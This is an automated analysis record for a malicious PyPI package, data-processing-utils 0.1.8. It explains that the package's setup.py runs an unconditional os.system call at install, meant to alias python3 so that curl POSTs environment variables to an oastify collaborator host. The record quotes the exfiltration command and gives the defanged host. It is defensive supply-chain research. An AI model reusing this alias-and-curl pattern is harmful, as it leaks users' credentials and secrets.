# pypi data-processing-utils@0.1.8

**Source:** pypi_malregistry · **Source label:** malicious · **Released:** not found · **Assessment:** malicious (medium) · **Analysis:** ai (claude-opus-5-5)

## Summary

The sdist uses the setuptools backend, so `setup.py` runs at install. Its top level calls `os.system` once, with no condition in front, on a shell line that defines an alias `python3` meant to `curl -X POST` the output of `env` to an oastify (Burp Collaborator) host and then run the real `python3`. There are no gates: no OS, env or artifact checks, no cmdclass. In practice the shell only runs `env` to build the alias text and then defines the alias in a subshell that exits right away, so nothing is sent at install.

## Execution

- **setup_py** `python setup.py (pip install from sdist)`: runs setup.py; direct_script, inline_shell; errors hidden.

## Gates

None.

## Requirements

- installed_tool: sh (os.system hands the command to /bin/sh; the alias builtin and $(env) need a POSIX shell (cmd.exe on Windows just fails).)
- installed_tool: env (command substitution $(env) runs the env binary to collect environment variables.)

## Behaviour

- Ungated: spawn_process
- Gated: none

## Notes

- Exfil host (not contacted at install): hxxps://v95b8bj2eirzfyr4nzj762ved5jw71vq[.]oastify[.]com.
- The alias trick looks aimed at shadowing `python3` for the victim's later use, but `os.system` runs it in a child `sh` that dies straight after, and non-interactive shells don't expand aliases anyway. Recorded as `spawn_process` only; a reviewer may want to confirm this reading.
- On Windows, `cmd.exe` has no `alias` command, so the call just fails quietly (exit code ignored).
- `spec.md` and `README.md` describe a different demo package name; they are documentation, not install code.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "pypi",
    "name": "data-processing-utils",
    "version": "0.1.8",
    "archive_sha256": "c627db5caefeff1d59f4fd0f50ea17d5b2a750557a6e15db1166bff0e1c9c7f0",
    "source_dataset": "pypi_malregistry",
    "source_label": "malicious",
    "released_at": null,
    "released_at_source": null,
    "sample_path": "pypi_malregistry/pypi/malicious_intent/data_processing_utils-0.1.8.tar.gz",
    "package_root": "layer0/data_processing_utils-0.1.8",
    "cluster_key": "dee7da284871910bf4fc0172134428f6595316fb37acb41458a16f82fe01c165",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "setup_py",
        "command": "python setup.py (pip install from sdist)",
        "runs_on": "always",
        "file_chain": [
          "setup.py"
        ],
        "interpreter": "python",
        "launch_style": [
          "direct_script",
          "inline_shell"
        ],
        "silent_failure": true
      }
    ],
    "delays": [],
    "notes": [
      "setup.py: read in full (41 lines). Only package code at install is the top-level os.system call on line 7; setup() itself is plain metadata with no cmdclass. Nothing unread.",
      "os.system runs: alias python3=\"curl -X POST <oastify host> -d \"$(env)\" && python3\". The shell runs env (command substitution) to build the alias text, then only defines aliases in the short-lived sh child.",
      "curl is never executed at install: the alias exists only in the os.system subshell, which exits immediately, and aliases are not expanded in non-interactive shells anyway. So no env data leaves the machine at install time.",
      "$(env) sits outside the shell quotes, so its output is word-split into extra alias arguments; builtin arguments are not re-parsed, so the && and curl text never execute.",
      "silent_failure: os.system's return code is discarded, so a failing shell (e.g. on Windows, where cmd has no alias command) does not stop the build.",
      "Not install-reached: data_processing_utils/__init__.py and core.py (import-time only; __init__ just re-exports hello). spec.md and README.md are docs for a different demo package name, not code."
    ]
  },
  "requirements": [
    {
      "axis": "installed_tool",
      "value": "sh",
      "reason": "os.system hands the command to /bin/sh; the alias builtin and $(env) need a POSIX shell (cmd.exe on Windows just fails)."
    },
    {
      "axis": "installed_tool",
      "value": "env",
      "reason": "command substitution $(env) runs the env binary to collect environment variables."
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "spawn_process"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": false,
    "endpoints": []
  },
  "attack_type": "malicious_new_package",
  "family_hint": "oastify-env-alias",
  "claude_assessment": "malicious",
  "assessment_reason": "setup.py runs an unconditional shell command at install that is clearly written to POST the full environment (env) to an oastify (Burp Collaborator) host via a python3 alias. As written it only defines an alias in a throwaway subshell, so the exfil never fires at install, but the intent is malicious.",
  "label_disagreement": false,
  "confidence": "medium",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
